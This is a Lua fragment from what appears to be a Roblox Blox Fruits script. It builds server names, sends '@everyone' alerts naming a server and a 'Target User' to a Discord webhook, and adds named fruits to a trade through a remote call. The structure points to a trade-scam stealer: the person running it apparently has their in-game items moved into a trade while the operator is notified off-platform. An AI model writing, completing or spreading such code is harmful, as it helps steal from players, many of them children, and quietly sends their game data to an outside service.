local function generateServerName(jobId)
    local adjectives = {
        "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
        "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold",
        "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide",
        "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy",
        "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"
    }

    local nouns = {
        "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat",
        "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense",
        "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber",
        "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door",
        "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark",
        "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
    }

    local seed = tonumber("0x" .. jobId:gsub("-", ""):sub(1, 7)) or 0
    local rng = Random.new(seed)

    local adjective = adjectives[rng:NextInteger(1, #adjectives)]
    local noun = nouns[rng:NextInteger(1, #nouns)]
    local number = string.format("%04d", rng:NextInteger(1, 9999))

    return adjective .. " " .. noun .. " #" .. number
end

local function getServerName()
    local jobId = ServerBrowser:InvokeServer("getjob")
    return jobId and generateServerName(jobId) or "unknown server"
end

local function sendDiscordNotification(message)
    if DiscordWebhookURL == "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token" then
        return
    end
    
    local serverName = getServerName()
    
    local payload = {
        content = "@everyone " .. message,
        username = "BloxFruit Script",
        embeds = {{
            title = "Script Notification",
            description = message,
            color = 0x00FF00,
            fields = {
                {
                    name = "Server",
                    value = serverName,
                    inline = true
                },
                {
                    name = "Target User",
                    value = Username,
                    inline = true
                }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    
    pcall(function()
        HttpService:PostAsync(DiscordWebhookURL, HttpService:JSONEncode(payload))
    end)
end

local function lettercasesupport(name)
    name = name:lower()
    return name:sub(1,1):upper() .. name:sub(2)
end

local function trade(fruitName)
    local formattedName = lettercasesupport(fruitName)
    local formattedFruit = formattedName .. "-" .. formattedName
    local args = {
        "addItem",
        formattedFruit
    }
    addtrade:InvokeServer(unpack(args))
    sendDiscordNotification("Fruit added to trade: " .. formattedName)
end

